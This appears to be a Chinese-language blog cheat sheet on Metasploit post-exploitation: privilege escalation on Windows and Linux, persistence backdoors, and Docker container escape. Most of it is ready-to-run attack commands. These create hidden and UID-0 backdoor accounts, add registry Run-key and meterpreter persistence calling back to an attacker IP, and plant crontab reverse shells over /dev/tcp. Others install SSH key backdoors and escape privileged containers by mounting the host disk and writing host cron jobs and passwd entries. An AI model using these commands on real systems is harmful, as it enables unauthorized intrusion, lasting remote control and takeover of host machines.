---
title: MSF提权与权限维持（含Docker逃逸）
date: 2026-07-23 13:00:00 +0800
categories: [工具速查, MSF利用]
tags: [Metasploit, 提权, 权限维持, Docker逃逸, 后渗透]
description: MSF 后渗透实战，涵盖Windows/Linux自动化提权、凭证窃取、持久化后门、Docker容器逃逸等核心技术。
---

# MSF提权与权限维持（含Docker逃逸）

## 一、权限提升（Windows + Linux）

### 1. Windows 自动提权

#### 内置 getsystem

```bash
meterpreter > getuid                # 查看当前权限
meterpreter > getsystem             # 自动尝试多种方式提升
```

> **知识点**：`getsystem` 底层实现了三种技术：Named Pipe Impersonation（命名管道模拟）、Token Duplication（令牌复制）、以及 Windows 服务漏洞利用。它会依次尝试直到成功。

#### 本地提权漏洞检测

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

> **知识点**：该模块自动检测系统已安装的补丁（通过 WMI 查询），然后与 MSF 的本地提权模块数据库匹配，输出可利用的 CVE 列表。这是内网渗透中最常用的"自动化提权路径发现"方法。

#### PowerUp 提权枚举

```bash
meterpreter > upload /root/PowerUp.ps1 C:\Windows\Temp\
meterpreter > shell
powershell -exec bypass -file C:\Windows\Temp\PowerUp.ps1 -Command Invoke-AllChecks
```

> **知识点**：PowerUp 是 SploitPowerSuite 的一部分，专门检测 Windows 提权路径：可写服务路径、未引用的服务路径、AlwaysInstallElevated 注册表漏洞、弱服务权限等。比普通漏洞扫描更深入。

#### PEASS 枚举

```bash
meterpreter > use post/multi/gather/peass
```

> **知识点**：PEASS（Privilege Escalation Awesome Scripts）是本地提权的全能枚举工具集合，LinPEAS 和 WinPEAS 分别对应 Linux 和 Windows。MSF 封装了自动化调用和结果收集。

### 2. Linux 自动提权

#### 漏洞检测

```bash
meterpreter > getuid
meterpreter > run post/multi/recon/local_exploit_suggester
```

#### LinPEAS 自动化检测

```bash
meterpreter > upload /root/linpeas.sh /tmp/
meterpreter > shell
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

> **知识点**：LinPEAS 会检测：SUID/SGID 文件、可写的 /etc/passwd、cron 任务、内核版本匹配已知漏洞（DirtyPipe、PwnKit 等）、sudo 配置错误、容器环境等。输出使用颜色标记风险等级。

#### SUID 手动提权

```bash
find / -perm -4000 2>/dev/null    # 查找 SUID 文件
# 如果找到 bash 具有 SUID：
/bin/bash -p                        # 以文件所有者权限运行
```

> **知识点**：SUID（Set User ID）权限允许用户以文件所有者的身份执行程序。如果 `/bin/bash` 被设置了 SUID，执行 `-p` 参数可以保留有效 UID，直接获得 root 权限。类似的有 `vim`、`find`、`cp`、`less` 等。

## 二、权限维持（Windows + Linux）

### 1. Windows 持久化

#### 创建隐藏管理员

```bash
meterpreter > shell
net user hacker$ Password@123 /add
net localgroup administrators hacker$ /add
```

> **知识点**：用户名以 `$` 结尾在 `net user` 命令中默认不可见，但在计算机管理面板中仍可见。需要配合注册表 `SpecialAccounts\UserList` 键值才能完全隐藏。

#### 注册表开机自启

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
```

> **知识点**：`HKLM\...\Run` 对所有用户生效，需要管理员权限；`HKCU\...\Run` 仅对当前用户生效。更高级的持久化方式包括：WMI 事件订阅、计划任务、服务创建、DLL 劫持、AppInit_DLLs 等。

#### MSF 持久化模块

```bash
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50
```

> **参数说明**：
> - `-X`：开机自启
> - `-i 10`：每 10 秒尝试回连
> - `-p`：回连端口
> - `-r`：回连 IP
>
> **原理**：该模块在目标上创建 VBS 脚本文件到临时目录，并写入 `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` 注册表项。

### 2. Linux 持久化

#### 添加 root 用户

```bash
meterpreter > shell
useradd -u 0 -o -g 0 -s /bin/bash -d /root hacker
echo "hacker:Password@123" | chpasswd
```

> **知识点**：`-u 0` 指定 UID 为 0（root），`-o` 允许重复 UID。创建后该用户可直接 SSH 登录且拥有 root 权限。检测时查看 `/etc/passwd` 中 UID=0 的非 root 账户。

#### SSH 密钥持久化

```bash
# 攻击机生成密钥
ssh-keygen -t rsa -b 2048 -f /root/.ssh/backdoor_rsa

# 上传公钥
meterpreter > mkdir /root/.ssh
meterpreter > upload /root/.ssh/backdoor_rsa.pub /root/.ssh/authorized_keys
meterpreter > chmod 600 /root/.ssh/authorized_keys
meterpreter > chmod 700 /root/.ssh

# 登录
ssh -i /root/.ssh/backdoor_rsa root@192.168.52.142
```

> **知识点**：`authorized_keys` 文件权限必须是 `600`（所有者可读写），`.ssh` 目录权限必须是 `700`，否则 SSH 会拒绝使用密钥认证。这是最常见的配置错误。

#### Crontab 定时回连

```bash
echo "* * * * * /bin/bash -i >& /dev/tcp/192.168.1.50/4444 0>&1" >> /var/spool/cron/root
```

> **知识点**：crontab 反弹是最经典的 Linux 持久化方法。写入 `/var/spool/cron/root` 需要 root 权限。更隐蔽的方式是写入用户级 crontab（`crontab -e`），或利用 `/etc/cron.d/` 目录。

#### MSF 持久化（Linux）

```bash
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50
```

## 三、Docker 容器逃逸

### 1. 判断容器环境

```bash
# 方法1
grep -q docker /proc/1/cgroup && echo "Docker 环境" || echo "非容器"

# 方法2（更严谨）
grep -E -q 'docker|containerd|kubelet' /proc/1/cgroup && echo "容器环境" || echo "物理机/虚拟机"
```

> **知识点**：`/proc/1/cgroup` 记录了进程的 cgroup 信息，容器环境下会包含 `docker`、`containerd`、`kubepods` 等关键词。另可通过检查 `.dockerenv` 文件（容器根目录存在）、或 hostname 是否为 12 位容器 ID 来判断。

### 2. MSF 逃逸模块速查

```bash
msf6 > search docker

use exploit/linux/local/docker_runc_escape                    # runc 漏洞（CVE-2019-5736）
use exploit/linux/local/docker_daemon_privilege_escalation    # Docker socket 暴露
use exploit/linux/local/docker_privileged_container_escape    # 特权模式逃逸
use exploit/linux/local/docker_privileged_container_kernel_escape  # 特权模式内核利用
use exploit/linux/local/docker_cgroup_escape                  # cgroup 逃逸
use exploit/linux/local/runc_cwd_priv_esc                     # K8s 集群逃逸
```

### 3. 特权模式逃逸

#### 验证特权模式

```bash
cat /proc/self/status | grep Cap
# CapEff 掩码为 0000003fffffffff 表示特权模式
```

> **知识点**：Linux Capabilities 将 root 权限拆分为多个细粒度能力。`CapEff=0000003fffffffff` 表示拥有全部 36 种能力，相当于完整 root 权限。Docker 特权模式（`--privileged`）会授予容器所有 capabilities 和设备访问权限。

#### 挂载宿主机磁盘

```bash
fdisk -l                    # 查看宿主机磁盘分区
mkdir /out
mount /dev/sda1 /out        # 将宿主机根分区挂载到容器内
cd /out; ls                 # 可直接访问宿主机文件系统
```

> **知识点**：特权模式下容器可以访问宿主机的 `/dev` 设备文件。挂载宿主机磁盘后，可以：修改 `/etc/passwd` 添加账户、写入 SSH 公钥、修改 crontab 创建宿主机定时任务、读取敏感文件等。

#### 通过定时任务实现宿主机反弹

```bash
# 攻击机监听
nc -lvvp 54321

# 容器内操作
touch /out/shell.sh
echo "bash -i >& /dev/tcp/192.168.79.130/54321 0>&1" > /out/shell.sh
echo "* * * * * root bash /shell.sh" >> /out/etc/crontab
```

> **知识点**：将反弹 shell 脚本写入宿主机文件系统，然后在宿主机 crontab 中注册。宿主机 cron 守护进程每分钟执行该脚本，建立反弹连接。这是最经典的特权模式 Docker 逃逸手法。

#### 修改 passwd 直接添加用户

```bash
echo "kali:x:1000:1000::/home/kali:/usr/bin/bash" >> /out/etc/passwd
echo "kali:$y$j9T$...:20519:0:99999:7:::" >> /out/etc/shadow
```

### 4. Docker Socket 逃逸

当 Docker socket（`/var/run/docker.sock`）挂载到容器内时：

```bash
# 容器内通过 socket 与 Docker daemon 交互
docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu chroot /host bash
```

> **知识点**：Docker Socket 暴露比特权模式更危险。攻击者可通过 API 创建新容器并挂载宿主机根目录，直接获取宿主机完整控制权。这是 CI/CD 环境中常见的配置错误。

## 四、速查对照表

| 场景 | 平台 | 命令/模块 |
|------|------|-----------|
| 自动提权 | Windows | `getsystem` / `local_exploit_suggester` |
| 自动提权 | Linux | `local_exploit_suggester` / `linpeas.sh` |
| SUID 提权 | Linux | `find / -perm -4000 2>/dev/null` |
| 隐藏用户 | Windows | `net user hacker$ pass /add` |
| 隐藏用户 | Linux | `useradd -u 0 -o ...` |
| 注册表自启 | Windows | `reg add HKLM\...\Run` |
| SSH 持久化 | Linux | `upload pub → authorized_keys` |
| Crontab 持久化 | Linux | `echo ... >> /var/spool/cron/root` |
| 判断容器 | Linux | `grep docker /proc/1/cgroup` |
| 特权逃逸 | Linux | `mount /dev/sda1 /out` |
| MSF 持久化 | 通用 | `run persistence -X -i 10 -p x -r x` |

---

> 下一篇文章将介绍如何利用已控主机进行内网探测、凭证提取和横向移动。
